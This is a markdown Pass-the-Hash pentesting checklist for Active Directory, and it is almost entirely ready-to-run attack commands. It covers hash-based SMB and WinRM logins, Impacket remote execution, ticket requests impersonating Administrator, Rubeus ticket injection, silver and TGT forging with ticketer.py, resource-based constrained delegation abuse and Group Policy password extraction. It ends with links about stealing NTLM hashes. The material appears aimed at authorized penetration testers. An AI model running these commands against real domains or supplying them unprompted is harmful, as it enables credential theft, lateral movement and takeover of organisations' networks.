# Pass-the-Hash (PTH) Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After performing Pass-the-Hash techniques, I realistically expect to:

- [ ] Access remote systems using only NTLM hashes (no password needed)
- [ ] Enumerate SMB shares or use authenticated WinRM shells
- [ ] Interact with services like LDAP, SMB, WinRM, and RPC using hashes
- [ ] Forge TGT or ST tickets with RC4 hash for Kerberos abuse
- [ ] Exploit delegation and impersonation with forged tickets
- [ ] Conduct lateral movement or privilege escalation with ticket injection

---

## ‚úÖ Pass-the-Hash Pentest Checklist

- [ ] **SMB Enumeration using NTLM Hash**
  - List shares using the user's hash
    ```
    smbclient -L \\10.10.10.1 -U test.local/john --pw-nt-hash <NTLM_HASH>
    ```

- [ ] **WinRM Shell with NTLM Hash**
  - Authenticate to WinRM with hash
    ```
    evil-winrm -i 10.10.10.1 -u john -H <NTLM_HASH>
    ```

- [ ] **Remote Command Execution using Impacket**
  - Execute command over SMB using NTLM hash
    ```
    python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> test.local/john@10.10.10.1 whoami
    ```

- [ ] **Request TGT Ticket (getTGT.py)**
  - Request TGT using NTLM hash
    ```
    python3 getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :<NTLM_HASH>
    ```

- [ ] **Request ST with Impersonation (getST.py)**
  - Get service ticket impersonating another user
    ```
    python3 getST.py -hashes :<NTLM_HASH> -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john
    ```

- [ ] **Rubeus TGT Request with RC4**
  - Request and inject ticket
    ```
    Rubeus.exe asktgt /domain:test.local /user:john /rc4:<NTLM_HASH> /ptt
    ```

- [ ] **Forge Silver Ticket with ticketer.py**
  - Forge ST using SPN
    ```
    python3 ticketer.py -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
    ```

- [ ] **Forge TGT Ticket with ticketer.py**
  - Forge TGT for authentication
    ```
    python3 ticketer.py -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> -domain test.local -dc-ip 10.10.10.1 john
    ```

- [ ] **RBCD (Resource-Based Constrained Delegation) Abuse**
  - Write delegation permissions using NTLM hash
    ```
    python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :<NTLM_HASH> test.local/john
    ```

- [ ] **Monitor LDAP Changes (Authenticated)**
  - Monitor changes to AD with credentials
    ```
    python3 ldapmonitor.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1
    ```

- [ ] **Extract Group Policy Passwords (GPP)**
  - Pull GPP cpassword from SYSVOL
    ```
    python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local' -dc-ip 10.10.10.1
    ```

- [ ] **Find Uncommon SMB Shares**
  - Enumerate uncommon shares
    ```
    python3 FindUncommonShares.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1
    ```

---

## üìö Reference ‚Äì Stealing NTLM Hashes

- üîó https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
- üîó https://r4j3sh.medium.com/offsec-vault-proving-grounds-practice-writeup-380915703a09

---
